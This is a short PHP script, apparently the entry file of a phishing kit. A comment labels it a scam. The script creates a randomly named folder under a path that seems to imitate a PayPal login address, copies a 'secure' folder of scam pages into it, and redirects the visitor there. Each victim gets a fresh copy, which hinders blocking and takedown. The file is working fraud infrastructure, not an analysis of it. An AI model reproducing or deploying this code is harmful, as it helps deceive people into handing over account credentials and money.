<?php

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Create User FOLDER SCAM !
for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./mpp/-IDPP00C".$DIR;
$SZ118="secure";
function recurse_copy($SZ118,$DIR) {
$dir = opendir($SZ118);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($SZ118 . '/' . $file) ) {
recurse_copy($SZ118 . '/' . $file,$DIR . '/' . $file);
}
else {
copy($SZ118 . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $SZ118, $DIR );
#END
//LOCATION !
header("LOCATION: ".$DIR."");
?>
